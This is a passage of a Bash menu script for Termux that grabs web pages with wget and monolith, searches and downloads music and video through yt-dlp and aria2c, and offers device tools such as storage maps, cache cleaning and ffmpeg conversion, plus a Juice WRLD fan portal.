        
        case "$ch" in
            1)
                echo ""; printf "  ${WH}URL to grab: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                local domain=$(echo "$url" | awk -F[/:] '{print $4}')
                local savedir="/sdcard/Download/webgrab/$domain"
                mkdir -p "$savedir"
                echo ""
                printf "  ${C4}[*] Nano grab (HTML only)...${RESET}\n\n"
                wget -q --show-progress -O "$savedir/index.html" "$url"
                echo ""; printf "  ${GRN}✓ Saved to %s${RESET}\n" "$savedir"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""; printf "  ${WH}URL to grab: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                local domain=$(echo "$url" | awk -F[/:] '{print $4}')
                local savedir="/sdcard/Download/webgrab/$domain"
                mkdir -p "$savedir"
                echo ""
                printf "  ${C4}[*] Minimal grab (HTML + CSS + images)...${RESET}\n\n"
                wget -q --show-progress -E -H -k -K -p -e robots=off -P "$savedir" "$url"
                echo ""; printf "  ${GRN}✓ Saved to %s${RESET}\n" "$savedir"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""; printf "  ${WH}URL to mirror: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                local domain=$(echo "$url" | awk -F[/:] '{print $4}')
                local savedir="/sdcard/Download/webgrab/$domain"
                mkdir -p "$savedir"
                echo ""
                printf "  ${C4}[*] Full site mirror (use on small sites)...${RESET}\n\n"
                wget -q --show-progress -r -l 5 -E -H -k -K -p -e robots=off -P "$savedir" "$url"
                echo ""; printf "  ${GRN}✓ Mirrored to %s${RESET}\n" "$savedir"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""; printf "  ${WH}URL to save: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                local domain=$(echo "$url" | awk -F[/:] '{print $4}')
                local savedir="/sdcard/Download/webgrab/$domain"
                mkdir -p "$savedir"
                echo ""
                printf "  ${C4}[*] Single page save...${RESET}\n\n"
                wget -q --show-progress -E -H -k -K -p -e robots=off -P "$savedir" "$url"
                echo ""; printf "  ${GRN}✓ Saved to %s${RESET}\n" "$savedir"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                if ! command -v monolith &>/dev/null; then
                    printf "  ${RED}Monolith not installed — use option [6] to install${RESET}\n"
                    sleep 2
                    continue
                fi
                echo ""; printf "  ${WH}URL to grab: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                local domain=$(echo "$url" | awk -F[/:] '{print $4}')
                local savedir="/sdcard/Download/webgrab/$domain"
                mkdir -p "$savedir"
                local filename="$savedir/monolith_$(date +%Y%m%d_%H%M%S).html"
                echo ""
                printf "  ${C4}[*] Monolith grab (single HTML file)...${RESET}\n\n"
                monolith "$url" -o "$filename"
                echo ""; printf "  ${GRN}✓ Saved to %s${RESET}\n" "$filename"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""
                printf "  ${C4}[*] Installing monolith (requires rust + cargo)...${RESET}\n\n"
                printf "  ${WH}Installing rust...${RESET}\n"
                pkg install rust
                echo ""
                printf "  ${WH}Installing monolith via cargo...${RESET}\n"
                cargo install monolith
                echo ""
                printf "  ${GRN}✓ Monolith installed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [5] SEARCH PORTAL
# ═══════════════════════════════════════════════════════════════════

search_portal() {
    while true; do
        clear
        _portal_entry "Search Portal" "${C5}"
        echo ""
        _dv5
        printf "  ${C5}${BOLD}SEARCH PORTAL  —  16 Sources · iTunes · Archive.org · Multi-Source  ${RESET}\n"
        _dv5
        echo ""
        printf "  ${WH}yt-dlp · iTunes API · Archive.org · SC · Deezer · Mixcloud${RESET}\n"
        printf "  ${FADE}■ 16 sources loaded · iTunes sees the metadata · Archive.org holds the vault · multi-source hits two at once${RESET}\n"
        echo ""
        _dv5
        echo ""
        printf "  ${WH}[1-2]  Keyword search — YouTube (MP3 or video)                      ${RESET}\n"
        printf "  ${WH}[3]    Artist top 10 — full catalogue by artist                     ${RESET}\n"
        printf "  ${WH}[4]    Top 10 picker — list results with duration, you choose       ${RESET}\n"
        printf "  ${WH}[5]    Album — full project numbered                                ${RESET}\n"
        printf "  ${WH}[6-8]  SoundCloud/Audiomack/Bandcamp — direct URL or keyword        ${RESET}\n"
        printf "  ${WH}[9]    YouTube Music — music-specific index                         ${RESET}\n"
        printf "  ${WH}[10]   Mixcloud — DJ sets, radio shows, mixes                       ${RESET}\n"
        printf "  ${WH}[11]   Deezer — track/album/playlist URL                            ${RESET}\n"
        printf "  ${WH}[12]   iTunes lookup — Apple catalogue, genre + metadata            ${RESET}\n"
        printf "  ${WH}[13]   Archive.org — free music vault, rare cuts, live sets         ${RESET}\n"
        printf "  ${WH}[14]   Multi-source — YouTube + SoundCloud merged results           ${RESET}\n"
        printf "  ${WH}[15]   Lyrics search — paste a lyric line, find the song            ${RESET}\n"
        printf "  ${WH}[16]   Discography — pull full artist discography                   ${RESET}\n"
        printf "  ${WH}[17]   Download Queue — add URLs to aria2c queue, download all      ${RESET}\n"
        printf "  ${C5}[18]   Music Video — keyword → YouTube MV download (mp4)           ${RESET}\n"
        printf "  ${C5}[19]   TikTok / Shorts — keyword → short video search + download   ${RESET}\n"
        printf "  ${C5}[20]   Podcast search — search + download episode as MP3           ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv5
        echo ""
        _hover_hint "search"
        echo ""
        printf "  ${C5}${BOLD}Choice » ${RESET}"
        read -r ch
        
        case "$ch" in
            1)
                echo ""; printf "  ${WH}Search query: ${RESET}"; read -r query
                [[ -z "$query" ]] && continue
                echo ""
                printf "  ${C5}[*] Searching YouTube (MP3)...${RESET}\n\n"
                yt-dlp "ytsearch10:$query" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/%(title)s.%(ext)s"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""; printf "  ${WH}Search query: ${RESET}"; read -r query
                [[ -z "$query" ]] && continue
                echo ""
                printf "  ${C5}[*] Searching YouTube (video)...${RESET}\n\n"
                yt-dlp "ytsearch10:$query" -f "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best" -o "$DLDIR/%(title)s.%(ext)s"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""; printf "  ${WH}Artist name: ${RESET}"; read -r artist
                [[ -z "$artist" ]] && continue
                echo ""
                printf "  ${C5}[*] Searching top 10 for %s...${RESET}\n\n" "$artist"
                yt-dlp "ytsearch10:$artist" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/%(title)s.%(ext)s"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""; printf "  ${WH}Search query: ${RESET}"; read -r query
                [[ -z "$query" ]] && continue
                echo ""
                printf "  ${C5}[*] Listing top 10 results...${RESET}\n\n"
                yt-dlp "ytsearch10:$query" --print "%(title)s - %(uploader)s - %(duration_string)s" --skip-download | nl -w2 -s". "
                echo ""
                printf "  ${WH}Download which number? (1-10 or 0 for all): ${RESET}"; read -r num
                [[ -z "$num" ]] && continue
                
                if [[ "$num" == "0" ]]; then
                    yt-dlp "ytsearch10:$query" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/%(title)s.%(ext)s"
                else
                    yt-dlp "ytsearch10:$query" --playlist-items "$num" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/%(title)s.%(ext)s"
                fi
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""; printf "  ${WH}Album URL or search: ${RESET}"; read -r album
                [[ -z "$album" ]] && continue
                echo ""
                printf "  ${C5}[*] Downloading album...${RESET}\n\n"
                yt-dlp -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s" "$album"
                echo ""; printf "  ${GRN}✓ Album complete${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""; printf "  ${WH}SoundCloud URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C5}[*] SoundCloud download...${RESET}\n\n"
                yt-dlp -x --audio-format mp3 --embed-thumbnail -o "$DLDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""; printf "  ${WH}Audiomack URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C5}[*] Audiomack download...${RESET}\n\n"
                yt-dlp -x --audio-format mp3 -o "$DLDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""; printf "  ${WH}Bandcamp URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C5}[*] Bandcamp download...${RESET}\n\n"
                yt-dlp -x --audio-format mp3 --embed-thumbnail -o "$DLDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""; printf "  ${WH}Search YouTube Music: ${RESET}"; read -r query
                [[ -z "$query" ]] && continue
                echo ""
                printf "  ${C5}[*] YouTube Music search...${RESET}\n\n"
                yt-dlp "ytsearch10:$query music" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/%(title)s.%(ext)s"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                echo ""; printf "  ${WH}Mixcloud URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C5}[*] Mixcloud download...${RESET}\n\n"
                yt-dlp -x --audio-format mp3 -o "$DLDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            11)
                echo ""; printf "  ${WH}Deezer URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C5}[*] Deezer download (requires deemix or alternative tool)...${RESET}\n"
                printf "  ${YEL}Note: yt-dlp may not support Deezer directly. Install deemix for Deezer.${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            12)
                echo ""; printf "  ${WH}iTunes search query: ${RESET}"; read -r query
                [[ -z "$query" ]] && continue
                echo ""
                printf "  ${C5}[*] Searching iTunes...${RESET}\n\n"
                curl -s "https://itunes.apple.com/search?term=$(echo "$query" | sed 's/ /+/g')&limit=10" | grep -oP '"trackName":".*?","' | sed 's/"trackName":"//g' | sed 's/","/\n/g' | nl -w2 -s". "
                echo ""
                printf "  ${FADE}iTunes API provides metadata only — use another source to download${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            13)
                echo ""; printf "  ${WH}Archive.org search: ${RESET}"; read -r query
                [[ -z "$query" ]] && continue
                echo ""
                printf "  ${C5}[*] Searching Archive.org...${RESET}\n\n"
                printf "  ${WH}Opening search in browser: https://archive.org/search.php?query=%s${RESET}\n" "$(echo "$query" | sed 's/ /%20/g')"
                printf "  ${FADE}Copy direct URLs and use option [6-8] to download${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            14)
                echo ""; printf "  ${WH}Search query: ${RESET}"; read -r query
                [[ -z "$query" ]] && continue
                echo ""
                printf "  ${C5}[*] Multi-source search (YouTube + SoundCloud)...${RESET}\n\n"
                printf "  ${YEL}YouTube results:${RESET}\n"
                yt-dlp "ytsearch5:$query" --print "%(title)s - %(uploader)s" --skip-download | nl -w2 -s". "
                echo ""
                printf "  ${YEL}SoundCloud results:${RESET}\n"
                yt-dlp "scsearch5:$query" --print "%(title)s - %(uploader)s" --skip-download | nl -w2 -s". "
                echo ""
                printf "  ${WH}Download from: [1] YouTube  [2] SoundCloud  [3] Both: ${RESET}"; read -r src
                
                case "$src" in
                    1) yt-dlp "ytsearch5:$query" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/%(title)s.%(ext)s" ;;
                    2) yt-dlp "scsearch5:$query" -x --audio-format mp3 -o "$DLDIR/%(title)s.%(ext)s" ;;
                    3) 
                        yt-dlp "ytsearch5:$query" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/%(title)s.%(ext)s"
                        yt-dlp "scsearch5:$query" -x --audio-format mp3 -o "$DLDIR/%(title)s.%(ext)s" ;;
                    *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                esac
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            15)
                echo ""; printf "  ${WH}Paste lyric line: ${RESET}"; read -r lyric
                [[ -z "$lyric" ]] && continue
                echo ""
                printf "  ${C5}[*] Searching for song by lyrics...${RESET}\n\n"
                yt-dlp "ytsearch5:$lyric lyrics" --print "%(title)s - %(uploader)s" --skip-download | nl -w2 -s". "
                echo ""
                printf "  ${WH}Download which number? (1-5 or 0 for all): ${RESET}"; read -r num
                [[ -z "$num" ]] && continue
                if [[ "$num" == "0" ]]; then
                    yt-dlp "ytsearch5:$lyric lyrics" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/%(title)s.%(ext)s"
                else
                    yt-dlp "ytsearch5:$lyric lyrics" --playlist-items "$num" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/%(title)s.%(ext)s"
                fi
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            16)
                echo ""; printf "  ${WH}Artist name: ${RESET}"; read -r artist
                [[ -z "$artist" ]] && continue
                echo ""
                printf "  ${C5}[*] Pulling full discography for %s...${RESET}\n\n" "$artist"
                yt-dlp "ytsearch50:$artist full album" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/$artist/%(title)s.%(ext)s"
                echo ""; printf "  ${GRN}✓ Discography pull complete${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            17)
                clear; echo ""
                _dv5
                printf "  ${C5}${BOLD}DOWNLOAD QUEUE  ·  aria2c  ·  999${RESET}\n"
                _dv5; echo ""
                if ! command -v aria2c &>/dev/null; then
                    printf "  ${RED}aria2c not installed — run Tools [6] → Install Hub${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                printf "  ${FADE}Paste URLs one per line. Empty line when done.${RESET}\n\n"
                local _q_urls=()
                while true; do
                    printf "  ${C5}URL (empty to finish): ${RESET}"; read -r _qu
                    [[ -z "$_qu" ]] && break
                    _q_urls+=("$_qu")
                    printf "  ${GRN}✓ Added [%d]${RESET}\n" "${#_q_urls[@]}"
                done
                if (( ${#_q_urls[@]} == 0 )); then
                    printf "  ${FADE}Nothing queued.${RESET}\n"; sleep 1; continue
                fi
                echo ""
                printf "  ${WH}[1] MP3 audio  [2] Video  [3] Direct file: ${RESET}"; read -r _qmode
                echo ""
                printf "  ${C5}[*] Sending %d URL(s) to aria2c queue...${RESET}\n\n" "${#_q_urls[@]}"
                local _qtmp="${TMPDIR:-/tmp}/fezzy_queue_$$.txt"
                printf '%s\n' "${_q_urls[@]}" > "$_qtmp"
                case "$_qmode" in
                    1)
                        while IFS= read -r _u; do
                            yt-dlp -x --audio-format mp3 --embed-thumbnail --add-metadata \
                                -o "$DLDIR/%(title)s.%(ext)s" "$_u" &
                        done < "$_qtmp"
                        wait
                        printf "  ${GRN}✓ All MP3 pulls complete${RESET}\n" ;;
                    2)
                        while IFS= read -r _u; do
                            yt-dlp -f "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best" \
                                -o "$DLDIR/%(title)s.%(ext)s" "$_u" &
                        done < "$_qtmp"
                        wait
                        printf "  ${GRN}✓ All video pulls complete${RESET}\n" ;;
                    *)
                        aria2c --dir="$DLDIR" --input-file="$_qtmp" --max-connection-per-server=4 \
                            && printf "  ${GRN}✓ Queue complete${RESET}\n" \
                            || printf "  ${RED}Some downloads failed${RESET}\n" ;;
                esac
                rm -f "$_qtmp"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [6] TOOL PORTAL
# ═══════════════════════════════════════════════════════════════════

tool_portal() {
    while true; do
        clear
        _portal_entry "Tool Portal" "${C6}"
        echo ""
        _dv6
        printf "  ${C6}${BOLD}TOOL PORTAL  —  Storage Maps · Process Monitor · System Health  ${RESET}\n"
        _dv6
        echo ""
        printf "  ${WH}ncdu · ranger · htop · yt-dlp · gallery-dl${RESET}\n"
        printf "  ${FADE}■ Mothership maintenance bay · Bojack never sleeps · storage maps · keeping the operation clean${RESET}\n"
        echo ""
        _dv6
        echo ""
        printf "  ${WH}[1]  NCDU — scrollable visual storage map of entire device          ${RESET}\n"
        printf "  ${WH}[2]  Ranger — terminal file cockpit for your downloads              ${RESET}\n"
        printf "  ${WH}[3]  HTOP — live CPU, RAM and process monitor                       ${RESET}\n"
        printf "  ${WH}[4]  Battery — live level and charge status from Bojack K9          ${RESET}\n"
        printf "  ${WH}[5]  Storage check — downloads folder size and free space           ${RESET}\n"
        printf "  ${WH}[6]  Update yt-dlp — keep the video and audio ripper current        ${RESET}\n"
        printf "  ${WH}[7]  Update gallery-dl — keep the image ripper current              ${RESET}\n"
        printf "  ${WH}[8]  Network info — IP address, interface and wifi status           ${RESET}\n"
        printf "  ${WH}[9]  Clean cache — remove Termux tmp files, free space fast         ${RESET}\n"
        printf "  ${WH}[10] Convert — ffmpeg audio and video format converter              ${RESET}\n"
        printf "  ${WH}[11] Logs — view download activity and session log                  ${RESET}\n"
        echo ""
        printf "  ${C6}${BOLD}── INSTALL DEPENDENCIES ────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[12] Install Hub — install tools required for portals to work       ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv6
        echo ""
        _hover_hint "tools"
        echo ""
        printf "  ${C6}${BOLD}Choice » ${RESET}"
        read -r ch
        
        case "$ch" in
            1)
                clear
                printf "\n  ${C6}[*] Launching NCDU storage map...${RESET}\n\n"
                if command -v ncdu &>/dev/null; then
                    ncdu ~/storage
                else
                    printf "  ${RED}NCDU not installed — run: pkg install ncdu${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                fi ;;
            2)
                clear
                printf "\n  ${C6}[*] Launching Ranger file manager...${RESET}\n\n"
                if command -v ranger &>/dev/null; then
                    ranger ~/storage/downloads
                else
                    printf "  ${RED}Ranger not installed — run: pkg install ranger${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                fi ;;
            3)
                clear
                printf "\n  ${C6}[*] Launching HTOP process monitor...${RESET}\n\n"
                if command -v htop &>/dev/null; then
                    htop
                else
                    printf "  ${RED}HTOP not installed — run: pkg install htop${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                fi ;;
            4)
                echo ""
                printf "  ${C6}[*] Battery Status:${RESET}\n\n"
                if command -v termux-battery-status &>/dev/null; then
                    termux-battery-status | grep -E "percentage|status|temperature|health" | sed 's/^/  /'
                else
                    printf "  ${RED}Termux:API not installed — install from F-Droid + pkg install termux-api${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""
                printf "  ${C6}[*] Storage Check:${RESET}\n\n"
                du -sh ~/storage/downloads 2>/dev/null | awk '{print "  Downloads folder: "$1}'
                df -h ~/storage/downloads 2>/dev/null | tail -1 | awk '{print "  Free space: "$4" / "$2" ("$5" used)"}'
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""
                printf "  ${C6}[*] Updating yt-dlp...${RESET}\n\n"
                pip install --upgrade --break-system-packages yt-dlp
                echo ""; printf "  ${GRN}✓ yt-dlp updated${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""
                printf "  ${C6}[*] Updating gallery-dl...${RESET}\n\n"
                pip install --upgrade --break-system-packages gallery-dl
                echo ""; printf "  ${GRN}✓ gallery-dl updated${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""
                printf "  ${C6}[*] Network Info:${RESET}\n\n"
                ip addr show 2>/dev/null | grep "inet " | awk '{print "  IP: "$2}'
                printf "  ${WH}Gateway:${RESET} "; ip route show default 2>/dev/null | awk '{print $3}'
                if command -v termux-wifi-connectioninfo &>/dev/null; then
                    printf "  ${WH}WiFi:${RESET} "
                    termux-wifi-connectioninfo 2>/dev/null | grep -oP '"ssid":"[^"]+' | cut -d'"' -f4
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""
                printf "  ${C6}[*] Cleaning Termux cache...${RESET}\n\n"
                rm -rf $PREFIX/tmp/* 2>/dev/null
                rm -rf ~/.cache/* 2>/dev/null
                printf "  ${GRN}✓ Cache cleared${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                echo ""
                printf "  ${WH}Input file path: ${RESET}"; read -r infile
                [[ ! -f "$infile" ]] && { printf "  ${RED}File not found${RESET}\n"; sleep 1; continue; }
                printf "  ${WH}Output format (mp3/mp4/wav/flac/etc): ${RESET}"; read -r fmt
                local outfile="${infile%.*}.$fmt"
                echo ""
                printf "  ${C6}[*] Converting with ffmpeg...${RESET}\n\n"
                ffmpeg -i "$infile" "$outfile"
                echo ""; printf "  ${GRN}✓ Converted to %s${RESET}\n" "$outfile"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            11)
                echo ""
                printf "  ${C6}[*] Recent download logs:${RESET}\n\n"
                ls -lt ~/storage/downloads/*.{mp3,mp4,jpg,png,pdf} 2>/dev/null | head -20 | awk '{print "  "$9}' | sed 's|.*/||'
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            12) _install_hub ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [7] JUICE WRLD PORTAL
# ═══════════════════════════════════════════════════════════════════

juicewrld_portal() {
    while true; do
        clear
        _portal_entry "Juice WRLD" "${C7}"
        echo ""
        _dv7
        printf "  ${C7}${BOLD}JUICE WRLD  ·  999  ·  LEGENDS NEVER DIE  ${RESET}\n"
        _dv7
        echo ""
        printf "  ${WH}yt-dlp · archive · cookies · ~/storage/downloads/juicewrld${RESET}\n"
        printf "  ${FADE}■ 999 forever · vault never closes · unreleased · all platforms · archive protected${RESET}\n"
        echo ""
        _dv7
        echo ""
        printf "  ${WH}[1] Released Albums — G&GR · Death Race · LND · Fighting Demons · Party  ${RESET}\n"
        printf "  ${WH}[2] Vault/Unreleased — search leak channels, 15 results, pick or all   ${RESET}\n"
        printf "  ${WH}[3] Music Videos — official YouTube, all eras, numbered list pick       ${RESET}\n"
        printf "  ${WH}[4] Concert Footage — live shows, full sets, interviews, festivals      ${RESET}\n"
        printf "  ${WH}[5] SoundCloud Archive — pre-label era, early catalogue, JuiceTheKidd   ${RESET}\n"
        printf "  ${WH}[6] Artwork Pack — album covers, singles, features, split by type       ${RESET}\n"
        printf "  ${WH}[7] Intel Screen — all platforms, vault search terms, direct URLs       ${RESET}\n"
        printf "  ${WH}[8] Search Anything — type keyword, 15 results, pick or take all        ${RESET}\n"
        printf "  ${WH}[9] Download by URL — paste any link, cookies active, archive checked   ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv7
        echo ""
        _hover_hint "juicewrld"
        echo ""
        printf "  ${C7}${BOLD}Choice » ${RESET}"
        read -r ch
        
        case "$ch" in
            1)
                echo ""
                printf "  ${C7}[*] Released Albums:${RESET}\n\n"
                printf "  ${WH}[1] Goodbye & Good Riddance${RESET}\n"
                printf "  ${WH}[2] Death Race for Love${RESET}\n"
                printf "  ${WH}[3] Legends Never Die${RESET}\n"
                printf "  ${WH}[4] Fighting Demons${RESET}\n"
                printf "  ${WH}[5] The Party Never Ends (posthumous)${RESET}\n"
                echo ""
                printf "  ${WH}Album number or 0 for all: ${RESET}"; read -r alb
                
                case "$alb" in
                    1) query="Juice WRLD Goodbye and Good Riddance full album" ;;
                    2) query="Juice WRLD Death Race for Love full album" ;;
                    3) query="Juice WRLD Legends Never Die full album" ;;
                    4) query="Juice WRLD Fighting Demons full album" ;;
                    5) query="Juice WRLD The Party Never Ends full album" ;;
                    0) query="Juice WRLD discography all albums" ;;
                    *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7; continue ;;
                esac
                
                echo ""
                printf "  ${C7}[*] Downloading %s...${RESET}\n\n" "$query"
                yt-dlp "ytsearch20:$query" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/juicewrld/%(title)s.%(ext)s"
                echo ""; printf "  ${GRN}✓ Done — check $DLDIR/juicewrld${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""; printf "  ${WH}Search vault (e.g. 'unreleased', 'leak', specific song): ${RESET}"; read -r query
                [[ -z "$query" ]] && query="Juice WRLD unreleased"
                echo ""
                printf "  ${C7}[*] Searching vault channels...${RESET}\n\n"
                yt-dlp "ytsearch15:$query Juice WRLD" --print "%(title)s - %(uploader)s" --skip-download | nl -w2 -s". "
                echo ""
                printf "  ${WH}Download number (1-15) or 0 for all: ${RESET}"; read -r num
                [[ -z "$num" ]] && continue
                
                if [[ "$num" == "0" ]]; then
                    yt-dlp "ytsearch15:$query Juice WRLD" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/juicewrld/vault/%(title)s.%(ext)s"
                else
                    yt-dlp "ytsearch15:$query Juice WRLD" --playlist-items "$num" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/juicewrld/vault/%(title)s.%(ext)s"
                fi
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""
                printf "  ${C7}[*] Listing official music videos...${RESET}\n\n"
                yt-dlp "ytsearch20:Juice WRLD official video" --print "%(title)s" --skip-download | nl -w2 -s". "
                echo ""
                printf "  ${WH}Download number (1-20) or 0 for all: ${RESET}"; read -r num
                [[ -z "$num" ]] && continue
                
                if [[ "$num" == "0" ]]; then
                    yt-dlp "ytsearch20:Juice WRLD official video" -f "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best" -o "$DLDIR/juicewrld/videos/%(title)s.%(ext)s"
                else
                    yt-dlp "ytsearch20:Juice WRLD official video" --playlist-items "$num" -f "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best" -o "$DLDIR/juicewrld/videos/%(title)s.%(ext)s"
                fi
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""
                printf "  ${C7}[*] Concert footage search (live shows, interviews)...${RESET}\n\n"
                yt-dlp "ytsearch15:Juice WRLD live concert full show" --print "%(title)s - %(uploader)s" --skip-download | nl -w2 -s". "
                echo ""
                printf "  ${WH}Download number (1-15) or 0 for all: ${RESET}"; read -r num
                [[ -z "$num" ]] && continue
                
                if [[ "$num" == "0" ]]; then
                    yt-dlp "ytsearch15:Juice WRLD live concert full show" -f "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best" -o "$DLDIR/juicewrld/live/%(title)s.%(ext)s"
                else
                    yt-dlp "ytsearch15:Juice WRLD live concert full show" --playlist-items "$num" -f "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best" -o "$DLDIR/juicewrld/live/%(title)s.%(ext)s"
                fi
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""
                printf "  ${C7}[*] SoundCloud Archive (JuiceTheKidd era)...${RESET}\n\n"
                printf "  ${WH}Search SoundCloud for early/rare tracks${RESET}\n"
                printf "  ${WH}URL or search query: ${RESET}"; read -r scquery
                [[ -z "$scquery" ]] && continue
                echo ""
                yt-dlp -x --audio-format mp3 -o "$DLDIR/juicewrld/soundcloud/%(title)s.%(ext)s" "$scquery"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
